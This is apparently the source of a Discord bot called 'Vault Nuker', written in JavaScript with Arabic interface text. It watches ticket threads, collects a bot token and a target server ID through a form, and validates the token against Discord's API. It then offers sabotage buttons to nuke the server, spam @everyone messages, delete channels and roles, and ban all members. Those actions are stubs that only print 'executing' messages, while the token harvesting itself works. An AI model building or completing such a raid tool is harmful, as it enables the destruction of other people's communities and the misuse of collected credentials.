const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', () => {
    console.log(`[+] Vault Nuker is online: ${client.user.tag}`);
});

// ═══════════════════════════════════════════
// 1. مراقبة الـ Threads (تكتات Ticket King)
// ═══════════════════════════════════════════
client.on('threadCreate', async (thread) => {
    if (thread.name.includes('جحفلة') || thread.name.includes('nuke')) {
        
        setTimeout(async () => {
            const embed = new EmbedBuilder()
                .setTitle('💀 أداة الجحفلة')
                .setDescription('اضغط على الزر الأحمر في الأسفل عشان تعبي بيانات السيرفر اللي بدك تجحفله.')
                .setColor(0xFF0000);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_nuke')
                    .setLabel('بدء الجحفلة')
                    .setEmoji('💀')
                    .setStyle(ButtonStyle.Danger)
            );

            await thread.send({ embeds: [embed], components: [row] }).catch(()=>{});
        }, 2000);
    }
});

// ═══════════════════════════════════════════
// 2. التعامل مع الأزرار والنوافذ
// ═══════════════════════════════════════════
client.on(Events.InteractionCreate, async (interaction) => {
    
    // 1. زر بدء الجحفلة (تعبئة البيانات)
    if (interaction.isButton() && interaction.customId === 'start_nuke') {
        const modal = new ModalBuilder()
            .setCustomId('nuke_modal')
            .setTitle('بيانات الجحفلة');

        const tokenInput = new TextInputBuilder()
            .setCustomId('bot_token')
            .setLabel('توكن البوت (Bot Token)')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const guildInput = new TextInputBuilder()
            .setCustomId('guild_id')
            .setLabel('ايدي السيرفر (Server ID)')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        modal.addComponents(
            new ActionRowBuilder().addComponents(tokenInput),
            new ActionRowBuilder().addComponents(guildInput)
        );

        await interaction.showModal(modal);
    }

    // 2. استلام بيانات الدخول والتحقق
    if (interaction.isModalSubmit() && interaction.customId === 'nuke_modal') {
        const botToken = interaction.fields.getTextInputValue('bot_token');
        const guildId = interaction.fields.getTextInputValue('guild_id');

        await interaction.deferReply({ ephemeral: true });

        try {
            const res = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { Authorization: `Bot ${botToken}` }
            });

            if (!res.ok) {
                return interaction.editReply({ content: '❌ التوكن غلط أو البوت محظور.' });
            }

            const botData = await res.json();

            const embed = new EmbedBuilder()
                .setTitle('✅ تم استلام البيانات - اختر نوع التخريب')
                .setDescription(`**البوت:** ${botData.username}\n**السيرفر:** \`${guildId}\`\n\nالرجاء اختيار نوع التخريب:`)
                .setColor(0x57F287);

            // ═══════════════════════════════════════════
            // هنا غيرنا القائمة المنسدلة إلى أزرار ملونة
            // ═══════════════════════════════════════════
            const row1 = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('action_nuke').setLabel('نيوك كامل (Nuke)').setEmoji('💀').setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId('action_spam').setLabel('سبام (Spam)').setEmoji('💬').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId('action_delete_channels').setLabel('حذف رومات').setEmoji('🗑️').setStyle(ButtonStyle.Secondary)
            );

            const row2 = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('action_delete_roles').setLabel('حذف رتب').setEmoji('🛑').setStyle(ButtonStyle.Secondary),
                new ButtonBuilder().setCustomId('action_create_roles').setLabel('إنشاء رتب').setEmoji('⚙️').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId('action_ban_all').setLabel('طرد الكل').setEmoji('🔨').setStyle(ButtonStyle.Danger)
            );

            await interaction.editReply({ embeds: [embed], components: [row1, row2] });

        } catch (error) {
            console.error(error);
            await interaction.editReply({ content: '❌ حدث خطأ أثناء الاتصال.' });
        }
    }

    // ═══════════════════════════════════════════
    // 3. استلام ضغطات الأزرار (تطلع النوافذ)
    // ═══════════════════════════════════════════
    
    // زر السبام
    if (interaction.isButton() && interaction.customId === 'action_spam') {
        const modal = new ModalBuilder().setCustomId('modal_spam').setTitle('إعدادات السبام');
        
        const amount = new TextInputBuilder()
            .setCustomId('amount')
            .setLabel('كم رسالة بدك ترسل؟ (اكتب رقم)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('مثال: 100')
            .setRequired(true);
            
        const msg = new TextInputBuilder()
            .setCustomId('message')
            .setLabel('نص الرسالة')
            .setStyle(TextInputStyle.Paragraph)
            .setPlaceholder('مثال: @everyone سيرفركم تطبح!')
            .setRequired(true);
            
        modal.addComponents(new ActionRowBuilder().addComponents(amount), new ActionRowBuilder().addComponents(msg));
        await interaction.showModal(modal);
    }

    // زر النيوك
    if (interaction.isButton() && interaction.customId === 'action_nuke') {
        await interaction.reply({ content: '💀 **جاري تنفيذ النيوك الكامل...**', ephemeral: true });
    }

    // زر حذف الرومات
    if (interaction.isButton() && interaction.customId === 'action_delete_channels') {
        await interaction.reply({ content: '🗑️ **جاري حذف الرومات...**', ephemeral: true });
    }

    // زر حذف الرتب
    if (interaction.isButton() && interaction.customId === 'action_delete_roles') {
        await interaction.reply({ content: '🛑 **جاري حذف الرتب...**', ephemeral: true });
    }

    // زر إنشاء رتب
    if (interaction.isButton() && interaction.customId === 'action_create_roles') {
        await interaction.reply({ content: '⚙️ **جاري إنشاء الرتب...**', ephemeral: true });
    }

    // زر طرد الكل
    if (interaction.isButton() && interaction.customId === 'action_ban_all') {
        await interaction.reply({ content: '🔨 **جاري طرد الأعضاء...**', ephemeral: true });
    }

    // ═══════════════════════════════════════════
    // 4. استلام بيانات السبام
    // ═══════════════════════════════════════════
    if (interaction.isModalSubmit() && interaction.customId === 'modal_spam') {
        const amount = interaction.fields.getTextInputValue('amount');
        const msg = interaction.fields.getTextInputValue('message');
        await interaction.reply({ content: `✅ **تم استلام إعدادات السبام!**\n> العدد: \`${amount}\`\n> الرسالة: \`${msg}\`\n\n**جاري تنفيذ عملية السبام الآن...**`, ephemeral: true });
    }
});

http.createServer((req, res) => res.end('Bot is alive!')).listen(process.env.PORT || 3000);

client.login(TOKEN);
